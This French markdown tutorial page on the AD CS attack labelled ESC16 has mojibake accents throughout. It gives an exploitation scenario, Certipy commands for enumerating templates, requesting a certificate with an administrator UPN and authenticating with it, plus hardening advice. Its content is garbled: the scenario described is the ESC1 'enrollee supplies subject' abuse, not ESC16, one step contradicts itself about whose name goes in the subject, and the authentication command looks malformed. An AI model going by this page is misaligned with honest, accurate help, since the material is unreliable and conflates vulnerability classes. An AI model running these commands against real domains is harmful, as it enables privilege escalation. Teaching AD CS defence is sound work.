---
title: ESC16
date: '2025-07-15'
draft: false
---

# üõ°Ô∏è ESC16

## Qu'est-ce que la vuln√©rabilit√© ESC16 ?

**ESC16** est une vuln√©rabilit√© li√©e √† l'Active Directory Certificate Services (AD CS) permettant √† un attaquant d'obtenir des privil√®ges √©lev√©s en abusant de mauvaises configurations sur l'autorit√© de certification.

## üéØ Objectifs p√©dagogiques

- Comprendre le fonctionnement d'AD CS et des certificats dans AD
- Savoir comment l'attaque ESC16 est r√©alis√©e
- Identifier les risques li√©s √† la d√©l√©gation de droits sur les templates de certificats

## üìã Exemples de vuln√©rabilit√©s et exploitation

### Vuln√©rabilit√©s courantes

- **Templates de certificats mal configur√©s** : Permettent √† des utilisateurs non privil√©gi√©s de demander des certificats avec des droits √©lev√©s.
- **Extensions dangereuses activ√©es** : Possibilit√© de demander des certificats pour n'importe quel utilisateur (ESC1, ESC2, ESC8, ESC13, ESC16, etc.).

### Sc√©nario d'exploitation 

1. **Identification d'un template vuln√©rable** :
   - L'attaquant rep√®re un template de certificat qui permet l'inscription par des utilisateurs standards et l'option "ENROLLEE SUPPLIES SUBJECT".
2. **Demande d'un certificat d'administrateur** :
   - L'attaquant demande un certificat pour un compte administrateur en sp√©cifiant son propre nom d'utilisateur dans le champ subject.
3. **Utilisation du certificat pour s'authentifier** :
   - L'attaquant utilise le certificat obtenu pour s'authentifier en tant qu'administrateur.

### Commandes d'exploitation avec Certipy

```bash
# Enum√©rer les templates vuln√©rables
certipy-ad find -u user -p 'Password123!' -dc-ip 10.10.10.2 -domain ad.local

# Demander un certificat pour un compte admin
certipy-ad req -u user -p 'Password123!' -ca ca.ad.local -template vuln_template -upn admin@ad.local -dc-ip 10.10.10.2

# Utiliser le certificat pour s'authentifier
certipy-ad auth -u admin@ad.local -p '' -key admin.pfx -dc-ip 10.10.10.2
```

## üõ°Ô∏è Bonnes pratiques

- Restreindre les droits d'inscription sur les templates de certificats
- D√©sactiver les extensions dangereuses sur les templates
- Auditer r√©guli√®rement la configuration d'AD CS

## üìö Ressources utiles

- [HackTricks - ESC16](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-cs-esc1-esc13#esc16)
- [Certipy - ESC16](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [Microsoft - AD CS](https://learn.microsoft.com/fr-fr/windows-server/identity/ad-cs/)

---

_Derni√®re mise √† jour : 15 juillet 2025_
